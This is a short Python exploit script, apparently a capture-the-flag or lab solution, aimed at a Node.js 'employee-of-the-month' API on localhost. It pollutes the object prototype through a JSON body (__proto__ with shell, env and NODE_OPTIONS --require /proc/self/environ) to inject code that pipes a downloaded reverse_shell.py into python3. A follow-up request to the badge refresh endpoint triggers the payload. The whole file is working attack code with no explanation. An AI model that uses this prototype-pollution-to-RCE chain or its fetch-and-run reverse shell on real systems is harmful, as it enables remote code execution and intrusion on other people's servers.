import httpx

def exploit():
	client = httpx.Client()
	payload = "(curl http://localhost:8000/reverse_shell.py | python3) &"
	base_url = "http://localhost:3000"
	res = client.put(
		base_url + "/employee-of-the-month",
		headers={"cache-control": "no-cache"},
		json={
			"firstname": "Patrick",
			"lastname": "Payloadson",	
			"description": "Hello, I am Patrick Richardson! I've set up this API to display employees of the month!",
			"achievement": {
			"reason":"Setting up employee of the month API",
			"date":"2023-10-4 11:03:04"
			},
			"__proto__": {
				"argv0": "/proc/self/exe",
				"shell": "/proc/self/exe",
				"env": { 
	"get_rekt":f"console.log(require('child_process').execSync(`{payload}`).toString())//"
				},
				"NODE_OPTIONS" : "--require /proc/self/environ"
			}
		}
	)
	
	print(res, len(res.text))
	
	res = client.get(base_url + "/employee-of-the-month/badge/refresh", headers={"cache-control": "no-cache"})
	print(res, len(res.text))

exploit()